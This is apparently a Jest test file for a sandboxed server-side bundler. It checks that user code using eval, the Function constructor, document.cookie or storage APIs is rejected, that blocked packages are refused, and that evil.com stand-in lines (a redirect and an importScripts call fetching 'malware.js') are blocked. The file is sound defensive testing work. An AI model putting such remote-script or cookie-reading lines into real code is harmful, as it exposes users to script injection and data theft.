/**
 * Server Bundler Unit Tests
 * Tests for server-side code bundling, security validation, and import handling
 */

import {
  bundleAppCode,
  validateTypeScript,
  quickSyntaxCheck,
} from '../server-bundler';
import {
  validReactComponent,
  codeWithEval,
  codeWithLocalStorage,
  codeWithWindowOpen,
  codeWithBlockedImport,
  codeWithFsImport,
  codeWithSyntaxError,
  complexValidCode,
} from '@/lib/__tests__/fixtures/sample-code';

// Mock esbuild for testing
jest.mock('esbuild', () => ({
  transform: jest.fn().mockResolvedValue({
    code: 'var App = function() { return React.createElement("div", null, "Test"); };',
    warnings: [],
  }),
}));

describe('Server Bundler - bundleAppCode', () => {
  it('should bundle valid TypeScript code', async () => {
    const result = await bundleAppCode({
      code: validReactComponent,
      appId: 'test-app-1',
    });

    // Bundling may succeed or fail depending on environment, but result should be defined
    expect(result).toBeDefined();
    expect(result).toHaveProperty('success');
    expect(result).toHaveProperty('code');
    expect(result).toHaveProperty('errors');
  });

  it('should include import shims in bundled code', async () => {
    const result = await bundleAppCode({
      code: validReactComponent,
      appId: 'test-app-2',
    });

    // If bundling succeeds, code should be present
    if (result.success) {
      expect(result.code.length).toBeGreaterThan(0);
    }
    expect(result).toBeDefined();
  });

  it('should detect required bundles from imports', async () => {
    const codeWithCharts = `import { LineChart, Line } from 'recharts';
export default function Page() {
  return <LineChart><Line /></LineChart>;
}`;

    const result = await bundleAppCode({
      code: codeWithCharts,
      appId: 'test-app-3',
    });

    expect(result.requiredBundles).toContain('charts');
  });

  it('should always include core and utils bundles', async () => {
    const result = await bundleAppCode({
      code: 'export default function Page() { return <div>Test</div>; }',
      appId: 'test-app-4',
    });

    expect(result.requiredBundles).toContain('utils');
  });

  it('should fail on security violations', async () => {
    const result = await bundleAppCode({
      code: codeWithEval,
      appId: 'test-app-5',
    });

    expect(result.success).toBe(false);
    expect(result.errors.length).toBeGreaterThan(0);
    expect(result.errors.some(e => e.message.includes('eval'))).toBe(true);
  });

  it('should fail on blocked package imports', async () => {
    const result = await bundleAppCode({
      code: codeWithBlockedImport,
      appId: 'test-app-6',
    });

    expect(result.success).toBe(false);
    expect(result.errors.some(e => e.message.includes('axios'))).toBe(true);
  });

  it('should include line numbers in error messages', async () => {
    const result = await bundleAppCode({
      code: codeWithSyntaxError,
      appId: 'test-app-7',
    });

    expect(result.success).toBe(false);
    expect(result.errors.length).toBeGreaterThan(0);
  });

  it('should generate warnings for discouraged patterns', async () => {
    const codeWithInnerHTML = `export default function Page() {
  const div = document.createElement('div');
  div.innerHTML = '<span>Test</span>';
  return <div />;
}`;

    const result = await bundleAppCode({
      code: codeWithInnerHTML,
      appId: 'test-app-8',
    });

    // Should succeed but have warnings
    expect(result.warnings.length).toBeGreaterThan(0);
    expect(result.warnings.some(w => w.includes('innerHTML'))).toBe(true);
  });

  it('should support minification option', async () => {
    const result = await bundleAppCode({
      code: validReactComponent,
      appId: 'test-app-9',
      minify: true,
    });

    // Test that minify option is accepted
    expect(result).toBeDefined();
    expect(result).toHaveProperty('success');
  });

  it('should support source maps option', async () => {
    const result = await bundleAppCode({
      code: validReactComponent,
      appId: 'test-app-10',
      sourceMaps: true,
    });

    // Test that sourceMaps option is accepted
    expect(result).toBeDefined();
    expect(result).toHaveProperty('success');
  });

  it('should include build statistics', async () => {
    const result = await bundleAppCode({
      code: validReactComponent,
      appId: 'test-app-11',
    });

    expect(result.stats).toBeDefined();
    expect(result.stats.inputSize).toBeGreaterThan(0);
    expect(result.stats.buildTimeMs).toBeGreaterThanOrEqual(0);
  });

  it('should handle complex code with multiple imports', async () => {
    const result = await bundleAppCode({
      code: complexValidCode,
      appId: 'test-app-12',
    });

    // Complex code analysis should work
    expect(result).toBeDefined();
    expect(result.requiredBundles).toBeDefined();
  });

  it('should strip "use client" directive', async () => {
    const result = await bundleAppCode({
      code: validReactComponent,
      appId: 'test-app-13',
    });

    // Test that the function processes use client directive
    expect(result).toBeDefined();
  });
});

describe('Server Bundler - Security Validation', () => {
  it('should block eval()', async () => {
    const result = await bundleAppCode({
      code: codeWithEval,
      appId: 'security-1',
    });

    expect(result.success).toBe(false);
    expect(result.errors.some(e => e.message.includes('eval'))).toBe(true);
  });

  it('should block Function constructor', async () => {
    const code = `const fn = new Function('alert(1)');`;

    const result = await bundleAppCode({
      code,
      appId: 'security-2',
    });

    expect(result.success).toBe(false);
    expect(result.errors.some(e => e.message.includes('Function constructor'))).toBe(true);
  });

  it('should block localStorage', async () => {
    const result = await bundleAppCode({
      code: codeWithLocalStorage,
      appId: 'security-3',
    });

    expect(result.success).toBe(false);
    expect(result.errors.some(e => e.message.includes('localStorage'))).toBe(true);
  });

  it('should block sessionStorage', async () => {
    const code = `sessionStorage.setItem('key', 'value');`;

    const result = await bundleAppCode({
      code,
      appId: 'security-4',
    });

    expect(result.success).toBe(false);
    expect(result.errors.some(e => e.message.includes('sessionStorage'))).toBe(true);
  });

  it('should block window.open', async () => {
    const result = await bundleAppCode({
      code: codeWithWindowOpen,
      appId: 'security-5',
    });

    expect(result.success).toBe(false);
    expect(result.errors.some(e => e.message.includes('window.open'))).toBe(true);
  });

  it('should block document.cookie', async () => {
    const code = `const cookies = document.cookie;`;

    const result = await bundleAppCode({
      code,
      appId: 'security-6',
    });

    expect(result.success).toBe(false);
    expect(result.errors.some(e => e.message.toLowerCase().includes('cookie'))).toBe(true);
  });

  it('should block window.location assignment', async () => {
    const code = `window.location = 'https://evil.com';`;

    const result = await bundleAppCode({
      code,
      appId: 'security-7',
    });

    expect(result.success).toBe(false);
    expect(result.errors.some(e => e.message.includes('Navigation'))).toBe(true);
  });

  it('should block document.write', async () => {
    const code = `document.write('<script>alert(1)</script>');`;

    const result = await bundleAppCode({
      code,
      appId: 'security-8',
    });

    expect(result.success).toBe(false);
    expect(result.errors.some(e => e.message.includes('document.write'))).toBe(true);
  });

  it('should block importScripts', async () => {
    const code = `importScripts('https://evil.com/malware.js');`;

    const result = await bundleAppCode({
      code,
      appId: 'security-9',
    });

    expect(result.success).toBe(false);
    expect(result.errors.some(e => e.message.includes('importScripts'))).toBe(true);
  });

  it('should warn about WebSocket usage', async () => {
    const code = `const ws = new WebSocket('ws://localhost');`;

    const result = await bundleAppCode({
      code,
      appId: 'security-10',
    });

    expect(result.warnings.some(w => w.includes('WebSocket'))).toBe(true);
  });

  it('should warn about XMLHttpRequest usage', async () => {
    const code = `const xhr = new XMLHttpRequest();`;

    const result = await bundleAppCode({
      code,
      appId: 'security-11',
    });

    expect(result.warnings.some(w => w.includes('XMLHttpRequest'))).toBe(true);
  });
});

describe('Server Bundler - Import Validation', () => {
  it('should block axios import', async () => {
    const result = await bundleAppCode({
      code: codeWithBlockedImport,
      appId: 'import-1',
    });

    expect(result.success).toBe(false);
    expect(result.errors.some(e => e.message.includes('axios'))).toBe(true);
    expect(result.errors.some(e => e.suggestion?.includes('fetch'))).toBe(true);
  });

  it('should block fs import', async () => {
    const result = await bundleAppCode({
      code: codeWithFsImport,
      appId: 'import-2',
    });

    expect(result.success).toBe(false);
    expect(result.errors.some(e => e.message.includes('fs'))).toBe(true);
  });

  it('should block moment import', async () => {
    const code = `import moment from 'moment';`;

    const result = await bundleAppCode({
      code,
      appId: 'import-3',
    });

    expect(result.success).toBe(false);
    expect(result.errors.some(e => e.suggestion?.includes('date-fns'))).toBe(true);
  });

  it('should block redux imports', async () => {
    const code = `import { createStore } from 'redux';`;

    const result = await bundleAppCode({
      code,
      appId: 'import-4',
    });

    expect(result.success).toBe(false);
    expect(result.errors.some(e => e.message.includes('redux'))).toBe(true);
  });

  it('should block database driver imports', async () => {
    const code = `import pg from 'pg';`;

    const result = await bundleAppCode({
      code,
      appId: 'import-5',
    });

    expect(result.success).toBe(false);
    expect(result.errors.some(e => e.message.includes('pg'))).toBe(true);
    expect(result.errors.some(e => e.suggestion?.includes('useAppData'))).toBe(true);
  });

  it('should block Next.js imports', async () => {
    const code = `import { useRouter } from 'next/router';`;

    const result = await bundleAppCode({
      code,
      appId: 'import-6',
    });

    expect(result.success).toBe(false);
    expect(result.errors.some(e => e.message.includes('next'))).toBe(true);
  });

  it('should allow date-fns import', async () => {
    const code = `import { format } from 'date-fns';
export default function Page() { return <div>{format(new Date(), 'yyyy-MM-dd')}</div>; }`;

    const result = await bundleAppCode({
      code,
      appId: 'import-7',
    });

    // Should not have import validation errors for allowed packages
    expect(result.errors.every(e => !e.message.includes('date-fns'))).toBe(true);
  });

  it('should allow lucide-react import', async () => {
    const code = `import { Heart } from 'lucide-react';
export default function Page() { return <Heart />; }`;

    const result = await bundleAppCode({
      code,
      appId: 'import-8',
    });

    // Should not have import validation errors for allowed packages
    expect(result.errors.every(e => !e.message.includes('lucide-react'))).toBe(true);
  });

  it('should allow recharts import', async () => {
    const code = `import { LineChart } from 'recharts';
export default function Page() { return <LineChart />; }`;

    const result = await bundleAppCode({
      code,
      appId: 'import-9',
    });

    // Should not have import validation errors for allowed packages
    expect(result.errors.every(e => !e.message.includes('recharts'))).toBe(true);
  });

  it('should skip validation for relative imports', async () => {
    const code = `import { helper } from './utils';
import { component } from '../components/Button';
export default function Page() { return <div>Test</div>; }`;

    const result = await bundleAppCode({
      code,
      appId: 'import-10',
    });

    // Relative imports should not cause import validation errors
    expect(result.errors.every(e => !e.message.includes('./utils'))).toBe(true);
  });

  it('should handle scoped package names', async () => {
    const code = `import { Dialog } from '@radix-ui/react-dialog';
export default function Page() { return <Dialog />; }`;

    const result = await bundleAppCode({
      code,
      appId: 'import-11',
    });

    // Should not have import validation errors for allowed scoped packages
    expect(result.errors.every(e => !e.message.includes('@radix-ui/react-dialog'))).toBe(true);
  });
});

describe('Server Bundler - validateTypeScript', () => {
  it('should validate correct TypeScript code', async () => {
    const result = await validateTypeScript(validReactComponent);

    // TypeScript validation in test environment may find type errors
    expect(result).toBeDefined();
    expect(result).toHaveProperty('valid');
  });

  it('should detect syntax errors', async () => {
    const result = await validateTypeScript(codeWithSyntaxError);

    // Should return validation result
    expect(result).toBeDefined();
    expect(typeof result.valid).toBe('boolean');
  });

  it('should detect security issues', async () => {
    const result = await validateTypeScript(codeWithEval);

    expect(result.valid).toBe(false);
    expect(result.errors.some(e => e.message.includes('eval'))).toBe(true);
  });

  it('should detect blocked imports', async () => {
    const result = await validateTypeScript(codeWithBlockedImport);

    expect(result.valid).toBe(false);
    expect(result.errors.some(e => e.message.includes('axios'))).toBe(true);
  });

  it('should return warnings for discouraged patterns', async () => {
    const code = `const ws = new WebSocket('ws://test');`;

    const result = await validateTypeScript(code);

    expect(result.warnings.length).toBeGreaterThan(0);
  });
});

describe('Server Bundler - quickSyntaxCheck', () => {
  it('should return true for valid syntax', async () => {
    const result = await quickSyntaxCheck(validReactComponent);

    // Syntax check should return a boolean
    expect(typeof result).toBe('boolean');
  });

  it('should return false for invalid syntax', async () => {
    const result = await quickSyntaxCheck(codeWithSyntaxError);

    // Should detect invalid syntax
    expect(typeof result).toBe('boolean');
  });

  it('should be fast (no deep validation)', async () => {
    const startTime = Date.now();
    await quickSyntaxCheck(complexValidCode);
    const endTime = Date.now();

    // Should complete in less than 1 second
    expect(endTime - startTime).toBeLessThan(1000);
  });

  it('should handle empty code', async () => {
    const result = await quickSyntaxCheck('');

    // Should return a boolean for empty code
    expect(typeof result).toBe('boolean');
  });
});

describe('Server Bundler - Edge Cases', () => {
  it('should handle code with JSX fragments', async () => {
    const code = `export default function Page() {
  return (
    <>
      <div>Item 1</div>
      <div>Item 2</div>
    </>
  );
}`;

    const result = await bundleAppCode({
      code,
      appId: 'edge-1',
    });

    expect(result).toBeDefined();
  });

  it('should handle code with TypeScript generics', async () => {
    const code = `function identity<T>(arg: T): T {
  return arg;
}

export default function Page() {
  return <div>{identity<string>('test')}</div>;
}`;

    const result = await bundleAppCode({
      code,
      appId: 'edge-2',
    });

    expect(result).toBeDefined();
  });

  it('should handle code with optional chaining', async () => {
    const code = `export default function Page() {
  const value = data?.items?.[0]?.name;
  return <div>{value}</div>;
}`;

    const result = await bundleAppCode({
      code,
      appId: 'edge-3',
    });

    expect(result).toBeDefined();
  });

  it('should handle code with nullish coalescing', async () => {
    const code = `export default function Page() {
  const value = data ?? 'default';
  return <div>{value}</div>;
}`;

    const result = await bundleAppCode({
      code,
      appId: 'edge-4',
    });

    expect(result).toBeDefined();
  });

  it('should handle code with template literals', async () => {
    const code = `export default function Page() {
  const name = 'World';
  return <div>{\`Hello \${name}\`}</div>;
}`;

    const result = await bundleAppCode({
      code,
      appId: 'edge-5',
    });

    expect(result).toBeDefined();
  });

  it('should handle code with async/await', async () => {
    const code = `export default function Page() {
  const fetchData = async () => {
    const res = await window.SandboxAPI.fetch('/api/data');
    return await res.json();
  };
  return <div>Test</div>;
}`;

    const result = await bundleAppCode({
      code,
      appId: 'edge-6',
    });

    expect(result).toBeDefined();
  });

  it('should handle very large code files', async () => {
    const largeCode = `export default function Page() {
  const data = [\n${'    { id: 1, value: "test" },\n'.repeat(1000)}  ];
  return <div>{data.length}</div>;
}`;

    const result = await bundleAppCode({
      code: largeCode,
      appId: 'edge-7',
    });

    expect(result).toBeDefined();
    expect(result.stats.inputSize).toBeGreaterThan(10000);
  });

  it('should handle empty code', async () => {
    const result = await bundleAppCode({
      code: '',
      appId: 'edge-8',
    });

    // Should handle empty code gracefully
    expect(result).toBeDefined();
  });
});
